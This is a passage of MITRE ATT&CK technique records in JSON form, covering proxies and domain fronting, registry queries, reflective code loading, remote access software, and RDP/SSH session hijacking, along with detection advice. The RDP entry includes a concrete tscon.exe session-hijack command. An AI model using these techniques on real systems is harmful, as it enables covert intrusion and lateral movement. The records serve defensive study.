{"ID":"T1090.004","name":"Proxy: Domain Fronting","description":"Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.","url":"https://attack.mitre.org/techniques/T1090/004","created":"14 March 2020","last modified":"30 March 2023","version":"1.1","tactics":"Command and Control","detection":"If SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1090","defenses bypassed":null,"contributors":"Matt Kelly, @breakersall","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Mythc Documentation),(Citation: Mandiant No Easy Breach),(Citation: FireEye SMOKEDHAM June 2021),"}
{"ID":"T1090.002","name":"Proxy: External Proxy","description":"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.","url":"https://attack.mitre.org/techniques/T1090/002","created":"14 March 2020","last modified":"27 March 2020","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1090","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Trend Micro Muddy Water March 2021),(Citation: Novetta Winnti April 2015),(Citation: Group IB Silence Sept 2018),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: TrendMicro macOS Dacls May 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: ESET InvisiMole June 2020),(Citation: Kaspersky QakBot September 2021),(Citation: ESET InvisiMole June 2018),(Citation: DOJ GRU Indictment Jul 2018),(Citation: Reaqta MuddyWater November 2017),(Citation: Mythc Documentation),(Citation: ESET Okrum July 2019),(Citation: Kaspersky Regin),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: TrendMicro Tonto Team October 2020),(Citation: FireEye Operation Double Tap),(Citation: BitDefender Chafer May 2020),(Citation: Bitdefender Trickbot VNC module Whitepaper 2021),(Citation: Symantec MuddyWater Dec 2018),(Citation: FireEye APT10 Sept 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: FireEye APT28),(Citation: Cybereason Soft Cell June 2019),(Citation: FireEye APT10 April 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: Bitdefender Trickbot C2 infra Nov 2020),(Citation: University of Birmingham C2)"}
{"ID":"T1090.001","name":"Proxy: Internal Proxy","description":"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.","url":"https://attack.mitre.org/techniques/T1090/001","created":"14 March 2020","last modified":"15 March 2020","version":"1.0","tactics":"Command and Control","detection":"Analyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1090","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ClearkSky Fox Kitten February 2020),(Citation: Novetta Winnti April 2015),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Kaspersky ProjectSauron Blog),(Citation: FoxIT Wocao December 2019),(Citation: Novetta-Axiom),(Citation: FireEye APT39 Jan 2019),(Citation: ESET InvisiMole June 2018),(Citation: Check Point Pay2Key November 2020),(Citation: Mythc Documentation),(Citation: FireEye APT30),(Citation: Symantec RAINDROP January 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Zscaler Higaisa 2020),(Citation: Symantec W32.Duqu),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: BitDefender Chafer May 2020),(Citation: Accenture HyperStack October 2020),(Citation: ESET Sednit Part 2),(Citation: Talos TinyTurla September 2021),(Citation: cobaltstrike manual),(Citation: ESET Dukes October 2019),(Citation: NSA/FBI Drovorub August 2020),(Citation: University of Birmingham C2)"}
{"ID":"T1090.003","name":"Proxy: Multi-hop Proxy","description":"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing)\n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.","url":"https://attack.mitre.org/techniques/T1090/003","created":"14 March 2020","last modified":"21 October 2020","version":"2.0","tactics":"Command and Control","detection":"When observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as [Tor](https://attack.mitre.org/software/S0183)) or known adversary infrastructure that uses this technique.\n\nIn context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.","platforms":"Linux, Network, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1090","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: ESET Kobalos Feb 2021),(Citation: NJCCIC Ursnif Sept 2016),(Citation: ESET GreyEnergy Oct 2018),(Citation: FoxIT Wocao December 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: ProofPoint Ursnif Aug 2016),(Citation: Mandiant No Easy Breach),(Citation: Dingledine Tor The Second-Generation Onion Router),(Citation: SecureWorks WannaCry Analysis),(Citation: MSTIC Nobelium Oct 2021),(Citation: BlackBerry CostaRicto November 2020),(Citation: synack 2016 review),(Citation: Dragos Crashoverride 2017),(Citation: objsee mac malware 2017),(Citation: ESET Attor Oct 2019),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Bitdefender StrongPity June 2020),(Citation: Symantec Inception Framework March 2018),(Citation: ESET Kobalos Jan 2021),(Citation: Checkpoint Dridex Jan 2021),(Citation: TrendMicro Pawn Storm Dec 2020),(Citation: NCSC CISA Cyclops Blink Advisory February 2022),"}
{"ID":"T1012","name":"Query Registry","description":"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","url":"https://attack.mitre.org/techniques/T1012","created":"31 May 2017","last modified":"03 April 2023","version":"1.3","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Windows","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Secureworks REvil September 2019),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Talent-Jump Clambling February 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: CyberBit Dtrack),(Citation: FoxIT Wocao December 2019),(Citation: Unit42 BabyShark Feb 2019),(Citation: ESET InvisiMole June 2018),(Citation: Kaspersky WIRTE November 2021),(Citation: Trustwave Pillowmint June 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: FireEye APT34 Dec 2017),(Citation: ESET Sednit Part 2),(Citation: US-CERT Bankshot Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Talos Bisonal Mar 2020),(Citation: Lastline PlugX Analysis),(Citation: NCC Group Team9 June 2020),(Citation: Symantec Hydraq Jan 2010),(Citation: McAfee Gold Dragon),(Citation: Securelist APT10 March 2021),(Citation: RATANKBA),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Cisco DNSMessenger March 2017),(Citation: Unit42 BendyBear Feb 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: FireEye APT30),(Citation: CIRCL PlugX March 2013),(Citation: Malwarebytes Saint Bot April 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: GitHub PowerSploit May 2012),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gelsemium June 2021),(Citation: Microsoft FinFisher March 2018),(Citation: FBI FLASH APT39 September 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Talos TinyTurla September 2021),(Citation: FireEye APT28),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Nccgroup Emissary Panda May 2018),(Citation: ESET Dukes October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: ESET Carbon Mar 2017),(Citation: Unit 42 Valak July 2020),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Palo Alto Shamoon Nov 2016),(Citation: McAfee Sharpshooter December 2018),(Citation: ESET GreyEnergy Oct 2018),(Citation: Novetta Blockbuster Loaders),(Citation: ESET Industroyer),(Citation: Trend Micro Waterbear December 2019),(Citation: Novetta Blockbuster),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Talos Group123),(Citation: Talos ZxShell Oct 2014),(Citation: ESET Attor Oct 2019),(Citation: Prevx Carberp March 2011),(Citation: FinFisher Citation),(Citation: Kaspersky StoneDrill 2017),(Citation: FireEye FELIXROOT July 2018),(Citation: ESET Zebrocy May 2019),(Citation: GDATA Zeus Panda June 2017),(Citation: ESET OceanLotus Mar 2019),(Citation: Kaspersky Turla),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: FireEye Periscope March 2018),(Citation: Palo Alto Reaver Nov 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: NCC Group Chimera January 2021),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Symantec Buckeye),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: NCC Group WastedLocker June 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: US-CERT TA18-074A),(Citation: FireEye APT32 May 2017),(Citation: Cybereason Bazar July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Microsoft Reg),(Citation: HP SVCReady Jun 2022),(Citation: ClearSky Charming Kitten Dec 2017),(Citation: Accenture Lyceum Targets November 2021),(Citation: Gh0stRAT ATT March 2019),(Citation: PowerSploit Documentation),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Palo Alto OilRig May 2016),(Citation: ESET ComRAT May 2020),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Trend Micro njRAT 2018),(Citation: FireEye CARBANAK June 2017),(Citation: Crowdstrike Indrik November 2018),(Citation: McAfee GhostSecret),"}
{"ID":"T1620","name":"Reflective Code Loading","description":"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk. Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL)\n\nReflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)","url":"https://attack.mitre.org/techniques/T1620","created":"05 October 2021","last modified":"21 April 2022","version":"1.0","tactics":"Defense Evasion","detection":"Monitor for code artifacts associated with reflectively loading code, such as the abuse of .NET functions such as <code>Assembly.Load()</code> and [Native API](https://attack.mitre.org/techniques/T1106) functions such as <code>CreateThread()</code>, <code>memfd_create()</code>, <code>execve()</code>, and/or <code>execveat()</code>.(Citation: 00sec Droppers)(Citation: S1 Old Rat New Tricks)\n\nMonitor for artifacts of abnormal process execution. For example, a common signature related to reflective code loading on Windows is mechanisms related to the .NET Common Language Runtime (CLR) -- such as mscor.dll, mscoree.dll, and clr.dll -- loading into abnormal processes (such as notepad.exe). Similarly, AMSI / ETW traces can be used to identify signs of arbitrary code execution from within the memory of potentially compromised processes.(Citation: MDSec Detecting DOTNET)(Citation: Introducing Donut)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Linux, Windows, macOS","data sources":"Module: Module Load, Process: OS API Execution, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Application control","contributors":"Joas Antonio dos Santos, @C0d3Cr4zy, Inmetrics; João Paulo de A. Filho, @Hug1nN__; Lior Ribak, SentinelOne; Rex Guo, @Xiaofei_REX, Confluera; Shlomi Salem, SentinelOne","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: McAfee Cuba April 2021),(Citation: CrowdStrike IceApple May 2022),(Citation: PowerSploit Documentation),(Citation: Talos Lokibot Jan 2021),(Citation: Donut Github),(Citation: wardle evilquest partii),(Citation: Qualys LolZarus),(Citation: GitHub PowerSploit May 2012),(Citation: RecordedFuture WhisperGate Jan 2022),(Citation: Lazarus APT January 2022),(Citation: SentinelLabs Metador Sept 2022),(Citation: MSTIC FoggyWeb September 2021),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET Gelsemium June 2021),(Citation: MDSec Brute Ratel August 2022),"}
{"ID":"T1219","name":"Remote Access Software","description":"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.(Citation: Symantec Living off the Land)\n\nRemote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. Installation of many remote access tools may also include persistence (ex: the tool's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)","url":"https://attack.mitre.org/techniques/T1219","created":"18 April 2018","last modified":"21 April 2022","version":"2.1","tactics":"Command and Control","detection":"Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.\n\n[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Matt Kelly, @breakersall; Zachary Stanford, @svch0st","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Tetra Defense Sodinokibi March 2020),(Citation: Trend Micro Muddy Water March 2021),(Citation: Microsoft Prestige ransomware October 2022),(Citation: Cisco Talos Intelligence Group),(Citation: Dell Dridex Oct 2015),(Citation: Symantec Thrip June 2018),(Citation: Cyble Egregor Oct 2020),(Citation: Costa AvosLocker May 2022),(Citation: DFIR Conti Bazar Nov 2021),(Citation: PTSecurity Cobalt Dec 2016),(Citation: ESET Trickbot Oct 2020),(Citation: Securelist DarkVishnya Dec 2018),(Citation: Bitdefender Trickbot March 2020),(Citation: Group-IB Anunak),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: Unit 42 Hildegard Malware),(Citation: ESET RTM Feb 2017),(Citation: Group IB Cobalt Aug 2017),(Citation: McAfee Night Dragon),(Citation: Anomali Static Kitten February 2021),(Citation: ESET EvilNum July 2020),(Citation: Securelist Kimsuky Sept 2013),(Citation: US-CERT Ukraine Feb 2016),(Citation: PTSecurity Cobalt Group Aug 2017),(Citation: FireEye CARBANAK June 2017),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Group IB RTM August 2019),(Citation: Cisco Talos Avos Jun 2022),"}
{"ID":"T1563","name":"Remote Service Session Hijacking","description":"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\n\nAdversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)","url":"https://attack.mitre.org/techniques/T1563","created":"25 February 2020","last modified":"23 March 2020","version":"1.0","tactics":"Lateral Movement","detection":"Use of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\n\nMonitor for processes and command-line arguments associated with hijacking service sessions.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"root, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1563.002","name":"Remote Service Session Hijacking: RDP Hijacking","description":"Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)","url":"https://attack.mitre.org/techniques/T1563/002","created":"25 February 2020","last modified":"23 March 2020","version":"1.0","tactics":"Lateral Movement","detection":"Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to detect RDP session hijacking.\n\nUse of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.","platforms":"Windows","data sources":"Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1563","defenses bypassed":null,"contributors":null,"permissions required":"SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Novetta-Axiom),(Citation: LogRhythm WannaCry),(Citation: Windows RDP Sessions)"}
{"ID":"T1563.001","name":"Remote Service Session Hijacking: SSH Hijacking","description":"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.\n\nIn order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)\n\n[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).","url":"https://attack.mitre.org/techniques/T1563/001","created":"25 February 2020","last modified":"23 March 2020","version":"1.0","tactics":"Lateral Movement","detection":"Use of SSH may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. Also monitor user SSH-agent socket files being used by different users.","platforms":"Linux, macOS","data sources":"Command: Command Execution, Logon Session: Logon Session Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1563","defenses bypassed":null,"contributors":"Anastasios Pingios","permissions required":"root","supports remote":null,"system requirements":"SSH service enabled, trust relationships configured, established connections","impact type":null,"effective permissions":null,"relationship citations":",(Citation: Symantec SSH and ssh-agent)"}
{"ID":"T1021","name":"Remote Services","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. \n\nLegitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)","url":"https://attack.mitre.org/techniques/T1021","created":"31 May 2017","last modified":"30 March 2023","version":"1.3","tactics":"Lateral Movement","detection":"Correlate use of login activity related to remote services with unusual behavior or other malicious or suspicious activity. Adversaries will likely need to learn about an environment and the relationships between systems through Discovery techniques prior to attempting Lateral Movement. \n\nUse of applications such as ARD may be legitimate depending on the environment and how it’s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using these applications. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time. \n\nIn macOS, you can review logs for \"screensharingd\" and \"Authentication\" event messages. Monitor network connections regarding remote management (ports tcp:3283 and tcp:5900) and for remote login (port tcp:22).(Citation: Lockboxx ARD 2019)(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Logon Session: Logon Session Creation, Module: Module Load, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Dan Borges, @1njection","permissions required":null,"supports remote":null,"system requirements":"Active remote service accepting connections and valid credentials","impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET DazzleSpy Jan 2022),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: TrendMicro 